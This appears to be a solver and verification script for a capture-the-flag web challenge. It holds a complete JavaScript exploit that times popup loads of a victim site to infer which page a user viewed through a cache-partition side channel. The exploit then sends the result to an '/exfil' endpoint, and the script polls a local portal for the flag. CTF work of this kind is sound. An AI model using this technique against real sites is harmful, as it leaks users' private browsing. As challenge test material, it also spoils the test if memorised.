#!/usr/bin/env python3
"""
Automated solver / test verification script for cache-hard (Hardened)
"""
import sys
import time
import requests

PORTAL_URL = "http://127.0.0.1:8000"

EXPLOIT_PAYLOAD = """<!DOCTYPE html>
<html>
<head>
  <title>Cache Hard Solver</title>
</head>
<body>
  <h1>Double-Keyed Cache Partition Bypass Exploit</h1>
  <div id="log">Testing top-level navigation partitioned cache across 8 badges...</div>
  <script>
    const jobId = new URLSearchParams(window.location.search).get('jobId');

    function probeBadge(badge) {
      return new Promise((resolve) => {
        const t0 = performance.now();
        let win = null;
        let done = false;

        const finish = () => {
          if (done) return;
          done = true;
          const duration = performance.now() - t0;
          window.removeEventListener('message', onMsg);
          if (win) {
            try { win.close(); } catch (e) {}
          }
          resolve(duration);
        };

        const onMsg = (e) => {
          if (e.origin === 'http://victim.ctf:3000' && e.source === win && e.data && e.data.badge === badge) {
            finish();
          }
        };

        window.addEventListener('message', onMsg);
        setTimeout(finish, 500);

        // Open subwindow under victim.ctf top-level origin to access partitioned cache
        win = window.open('http://victim.ctf:3000/report/' + encodeURIComponent(badge));
        if (!win) {
          console.error('[Exploit Error] Popup blocked by browser for badge:', badge);
        }
      });
    }

    async function runExploit() {
      const log = document.getElementById('log');
      const badges = Array.from({ length: 8 }, (_, i) => `badge-${i}`);
      let bestBadge = null;
      let minDuration = Infinity;

      for (const badge of badges) {
        const duration = await probeBadge(badge);
        console.log(`[Top-Level Probe] ${badge} -> ${duration.toFixed(2)}ms`);

        if (duration < minDuration) {
          minDuration = duration;
          bestBadge = badge;
        }

        // Short pause between window opens
        await new Promise(r => setTimeout(r, 50));
      }

      console.log(`[Exploit] Detected viewed badge: ${bestBadge} (${minDuration.toFixed(2)}ms)`);
      log.textContent = `Identified: ${bestBadge}. Exfiltrating...`;

      // Exfiltrate detected badge with bound jobId
      await fetch('http://portal.ctf:8000/exfil?jobId=' + encodeURIComponent(jobId) + '&badge=' + encodeURIComponent(bestBadge));
    }

    window.addEventListener('DOMContentLoaded', runExploit);
  </script>
</body>
</html>
"""

def main():
    print(f"[*] Connecting to challenge portal at {PORTAL_URL}...")
    try:
        res = requests.post(
            f"{PORTAL_URL}/submit",
            json={"html": EXPLOIT_PAYLOAD},
            timeout=10
        )
        res.raise_for_status()
        data = res.json()
    except Exception as e:
        print(f"[-] Failed to submit exploit payload: {e}")
        sys.exit(1)

    job_id = data.get("jobId")
    print(f"[+] Exploit submitted successfully. Job ID: {job_id}")
    print("[*] Waiting for bot execution and double-keyed partition bypass...")

    flag = None
    start_time = time.time()
    while time.time() - start_time < 25:
        time.sleep(1)
        try:
            status_res = requests.get(f"{PORTAL_URL}/status/{job_id}", timeout=5)
            status_data = status_res.json()
            if status_data.get("flag"):
                flag = status_data["flag"]
                break
            if status_data.get("status") == "completed" and not status_data.get("flag"):
                print("[-] Bot finished without successful flag release.")
                break
        except Exception as e:
            print(f"[!] Polling error: {e}")

    if flag:
        print(f"\n[+] SUCCESS! Captured flag: {flag}\n")
        assert flag.startswith("CTF{")
        sys.exit(0)
    else:
        print("[-] Exploit failed to recover the flag.")
        sys.exit(1)

if __name__ == "__main__":
    main()
